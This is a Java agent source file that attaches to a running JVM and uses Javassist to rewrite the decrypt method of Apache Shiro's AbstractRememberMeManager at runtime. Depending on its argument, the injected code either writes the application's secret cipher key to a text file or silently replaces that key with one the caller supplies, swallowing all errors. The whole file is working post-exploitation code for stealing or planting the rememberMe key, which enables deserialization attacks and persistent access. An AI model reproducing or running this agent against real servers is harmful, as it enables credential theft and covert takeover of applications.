package com.alter.agent;

import javassist.*;

import java.io.FileWriter;
import java.io.IOException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.lang.reflect.Modifier;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;


public class TestAgent {

    /**
     * 主要函数 agentmain
     *
     * @param inst Instrumentation对象
     */
    public static void agentmain(String agentArgs, Instrumentation inst) throws IOException {
        Class[] loadedClass = inst.getAllLoadedClasses();
        for (Class clazz : loadedClass){
            String className = clazz.getName();
            if (inst.isModifiableClass(clazz)){
                if (className.equals("org.apache.shiro.mgt.AbstractRememberMeManager")){
                    System.out.println(className);
                    try {
                        ClassPool classPool = new ClassPool(true);
                        classPool.insertClassPath(new ClassClassPath(clazz));
                        classPool.insertClassPath(new LoaderClassPath(clazz.getClassLoader()));
                        CtClass ctClass = classPool.get(clazz.getName());
                        CtMethod ctMethod = ctClass.getMethod("decrypt", "([B)[B");
                        ctMethod.insertBefore(String.format("java.lang.String temp = \"%s\";\n" +
                                "if(temp.endsWith(\"\\.txt\")){" +
                                "try {\n" +
                                "   " +
                                "   java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(new java.io.File(temp),true);\n" +
                                "   fileOutputStream.write(\"Shiro key: \".getBytes());\n" +
                                "   fileOutputStream.write(org.apache.shiro.codec.Base64.encodeToString(getDecryptionCipherKey()).getBytes());\n" +
                                "   fileOutputStream.write(\"\\n\".getBytes());\n" +
                                "   fileOutputStream.flush();\n" +
                                "   fileOutputStream.close();\n}" +
                                "catch(java.lang.Throwable e){\n" +
                                "}\n}else{\n" +
                                "try{\n" +
                                "setCipherKey(org.apache.shiro.codec.Base64.decode(temp));\n" +
                                "}catch(java.lang.Throwable e){\n" +
                                "\n}\n}\n",agentArgs));
                        inst.redefineClasses(new ClassDefinition(clazz,ctClass.toBytecode()));
                        ctClass.detach();
                    } catch (UnmodifiableClassException | CannotCompileException e) {
                        e.printStackTrace();
                    } catch (NotFoundException e) {
                        e.printStackTrace();
                    } catch (ClassNotFoundException e) {
                        e.printStackTrace();
                    }
                }

            }
        }
        }
}
